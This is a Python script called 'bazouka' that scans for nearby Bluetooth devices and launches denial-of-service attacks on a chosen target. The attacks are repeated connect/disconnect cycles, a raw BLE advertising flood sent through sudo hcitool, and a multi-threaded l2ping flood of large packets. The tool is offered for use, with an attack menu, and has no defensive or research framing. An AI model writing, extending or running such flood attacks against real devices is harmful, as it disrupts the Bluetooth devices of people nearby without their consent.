# bazouka is a script that send packets via bluetooth
# And also tries connect and disconnect from a device.


                          # VERSION 1.5

from bleak import BleakClient
import asyncio
from dataclasses import dataclass
from datetime import datetime
from typing import Optional
from rich.progress import track
from bleak import BleakScanner
from bleak.backends.device import BLEDevice
from bleak.backends.scanner import AdvertisementData
from rich.console import Console
from rich.table import Table
import socket
import struct


console = Console()  # making object..
console.print("[bold green] made by: [/bold green]")

console.print(
    "                  __       _   _     \n"
    " _ __ ___  _ __  / _| ___ | |_(_)___ \n"
    "| '_ ` _ \\| '__|| |_ / _ \\| __| / __|\n"
    "| | | | | | |   |  _| (_) | |_| \\__ \\\n"
    "|_| |_| |_|_|___|_|  \\___/ \\__|_|___/\n"
    "           |_____|" \
        )

@dataclass
class FoundDevice:  # εδω ξεκιναει η αποθηκευση συσκευων...
    name: Optional[str]
    address: str
    rssi: int
    last_seen: datetime


devices: dict[str, FoundDevice] = {}

# fuction that called for bleue search.


def device_found(device: BLEDevice, advertisement_data: AdvertisementData):
    # εδω κανω μια αποπειρα να βγαζω καλυτερα τα ονοματα
    # κι οχι να ειναι γεματα unknown devices.
    previous_device=devices.get(device.address)
    detected_name=(
            advertisement_data.local_name
            or device.name
            or (previous_device.name if previous_device else None)
        )

    devices[device.address] = FoundDevice(
        name=detected_name,
        address=device.address,
        rssi=advertisement_data.rssi,
        last_seen=datetime.now(),
    )


async def scan_for_devices(seconds: int = 15): # !!! αμα αλλαξεις το νουμερο :
                                               # -> μεγαλυτερη-μικροτερη σαρωση...
    scanner = BleakScanner(device_found)
    await scanner.start()
    # i put a progress track here just 4 fun hahha
    
    for _ in track(range(seconds),description="[blue] starting scan for bluetooth devices... ([red]time default: 15 secs.[/red])[/blue]"
                   ,style="green"):
        
        await asyncio.sleep(1)
    await scanner.stop()
    show_devices()

def show_devices():

    # geting the infos....
     

    table=Table(title="Bluetooth devices")
    table.add_column("ID")
    table.add_column("Name")
    table.add_column("Address")
    table.add_column("signal")
    table.add_column("last_seen")

    for index,device in enumerate(devices.values(), start=1):
        table.add_row(
                str(index),
                device.name or "unknown ):",
                device.address,
                str(device.rssi),
                device.last_seen.strftime("%H:%M:%S"),
            )
        
    console.print(table)
    console.print("[cyan]\n the scan is done! [/cyan]")

def select_target() -> Optional[FoundDevice]:
    device_list=list(devices.values())
    if not device_list:
        console.print("[red]devices NOT FOUND ):[/red]")
        return None
    choise=console.input("[green]select device :[/green]")
    if not choise.isdigit():
        console.print("[yellow]Only numbers![/yellow]")
        return None
    index=int(choise)-1
    if index<0 or index>=len(device_list):
        console.print("[red] WRONG CHOISE BRO ):[/red]")
        return None
    return device_list[index]

async def disconnect_attack(target: FoundDevice, loops:int=10):
    console.print(f"\n[red][!] juming is starting... in target: "
                  f"{target.name or 'unknown'} ({target.address})[/red]")
    console.print(f"[yellow] running {loops} retries...[/yellow]\n")
    for attempt in range(1, loops +1):
        try:

            console.print(f"[dim]attempt {attempt}/{loops}....[/dim]")

            # generate client and connection
            client=BleakClient(target.address)
            await client.connect()
            await client.disconnect()
            console.print(f"SUCCESS [green][/green] ({attempt})")
        except Exception as e:
            console.print(f"[red]connection error ): {attempt}: {e}[/red]")

        # setting a delay....

        await asyncio.sleep(0.5)


async def ble_flood(target: FoundDevice, duration: int = 10):
    console.print(f"\n[red] BLE FLOOD on: "
                  f"{target.name or 'unknown'} ({target.address})[/red]")
    console.print(f"[yellow] Duration: {duration}s[/yellow]\n")
    console.print("[green] hcitool is ready! Real BLE transmission active![/green]\n")
    packets_sent = 0
    start_time = asyncio.get_event_loop().time()
    while (asyncio.get_event_loop().time() - start_time) < duration:
        try:
            tasks = []
            for _ in range(10):
                tasks.append(
                    asyncio.create_subprocess_exec(
                        "sudo", "hcitool", "-i", "hci0", "cmd", 
                        "0x08", "0x0008",
                        "1E", "02", "01", "06", "1B", "FF",
                        *(["FF"] * 25),
                        stdout=asyncio.subprocess.DEVNULL,
                        stderr=asyncio.subprocess.DEVNULL
                    )
                )
            await asyncio.gather(*tasks)
            packets_sent += 10
        except Exception as e:
            pass
        
        if packets_sent % 5000 == 0 and packets_sent > 0:
            console.print(f"[dim]{packets_sent} BLE packets transmitted...[/dim]")
    console.print(f"\n[green] BLE FLOOD done! {packets_sent} packets transmitted[/green]")
    console.print("[yellow] Advertising channels flooded with REAL BLE packets![/yellow]")



async def l2ping_flood(target: FoundDevice, size: int = 600, threads: int = 10, duration: int = 10):
    console.print(f"\n[red] L2PING FLOOD on: "
                  f"{target.name or 'unknown'} ({target.address})[/red]")
    console.print(f"[yellow] Size: {size} | Threads: {threads} | Duration: {duration}s[/yellow]\n")
    console.print("[green]Real l2ping binary active![/green]\n")

    import os
    l2ping_path = os.path.expanduser("~/bazouka.py/l2ping")

 # ping_worker func i m not sure if its stable yet (: ....

    async def ping_worker():
        while True:
            try:
                proc = await asyncio.create_subprocess_exec(
                    "sudo", l2ping_path, "-i", "hci0", "-s", str(size), "-f", target.address,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL
                )
                await proc.wait()
            except:
                pass

    workers = []
    for _ in range(threads):
        workers.append(asyncio.create_task(ping_worker()))

    await asyncio.sleep(duration)

    for w in workers:
        w.cancel()

    console.print(f"\n[green]✓ L2PING FLOOD done![/green]")


#     The Main func


if __name__ == "__main__":
    asyncio.run(scan_for_devices())
    selected_device = select_target()
    if selected_device:
        console.print(
            f"[green]Your selection:[/green] "
            f"{selected_device.name or 'unknown'} "
            f"({selected_device.address})"
        )

        console.print("\n [bold green] choose attack:[bold green]")
        console.print("[1] Disconnect Attack (connect/disconnect)")
        console.print("[2] packets send. (no connection)")
        console.print("[3] L2Ping Flood (Classic Bluetooth attack...")
        console.print("[q] EXIT")
        choice = console.input("\n[bold green]selection: [/bold green]").strip()
        if choice=="1":
            loops_input=console.input("[dim] how many loops ?[/dim]")
            loops=int(loops_input) if loops_input.isdigit() else 10
            asyncio.run(disconnect_attack(selected_device,loops))
            console.print(f"\n[cyan]Attack DONE ![/cyan]")

        elif choice=="2":
            duration_input=console.input("[dim]duration in seconds: [/dim]")
            duration=int(duration_input) if duration_input.isdigit() else 10
            asyncio.run(ble_flood(selected_device,duration))
            console.print(f"\n[cyan]Attack DONE ![/cyan]")

        elif choice=="3":

            size_input=console.input("[dim] lenght of packets (default 600):[/dim]")
            size=int(size_input) if size_input.isdigit() else 600
            threads_input=console.input("[dim]size of threads?(default 10)[/dim]")
            threads=int(threads_input) if threads_input.isdigit() else 10
            duration_input=console.input("[dim] duration in secs?[/dim]")
            duration=int(duration_input) if duration_input.isdigit() else 10
            asyncio.run(l2ping_flood(selected_device, size, threads, duration))
            console.print(f"\n[cyan]Attack DONE ![/cyan]")

        else:
            console.print(f"\n[red] see you soon (: [/red]")

                       ###### Thanks for the using this tool (: ######




